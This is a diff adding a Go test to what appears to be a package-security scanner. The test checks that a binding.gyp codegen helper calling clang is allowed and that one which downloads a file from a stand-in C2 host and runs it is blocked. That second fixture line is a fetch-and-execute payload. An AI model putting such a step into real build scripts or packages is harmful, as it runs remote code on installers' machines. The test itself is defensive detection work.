@@ -1807,3 +1807,24 @@ func TestRealNpmCacheAnchorFreeReadsStayOK(t *testing.T) {
 	}
 	t.Logf("real cacache: %d/%d anchor-free reads returned acquireOK, 0 mismatches", ok, len(integrities))
 }
+
+// Review MED 6: a binding.gyp action runs a codegen helper. One that shells
+// out to the toolchain must not be refused; one that pulls a URL and runs it
+// must be.
+func TestAnalyzeArtifact_GypActionHelper(t *testing.T) {
+	gyp := `{'targets':[{'target_name':'a','actions':[{'action_name':'gen','inputs':[],'outputs':['x.h'],'action':['python','tools/gen.py','<@(_outputs)']}]}]}`
+	pkg := func(helper string) []byte {
+		return makeTGZ(t, map[string]string{
+			"package/package.json": `{"name":"addon","version":"1.0.0"}`,
+			"package/binding.gyp":  gyp,
+			"package/tools/gen.py": helper,
+			"package/src/addon.cc": "int x;\n",
+		})
+	}
+	if v := analyzeArtifact("npm", pkg("import subprocess\nsubprocess.check_call(['clang', '--version'])\n")); v.Block {
+		t.Fatalf("clang --version codegen helper refused: %+v", v)
+	}
+	if v := analyzeArtifact("npm", pkg("import urllib.request, subprocess\nurllib.request.urlretrieve('https://c2.example.invalid/x', '/tmp/x')\nsubprocess.call(['/tmp/x'])\n")); !v.Block {
+		t.Fatalf("urlretrieve + exec gyp helper not refused: %+v", v)
+	}
+}
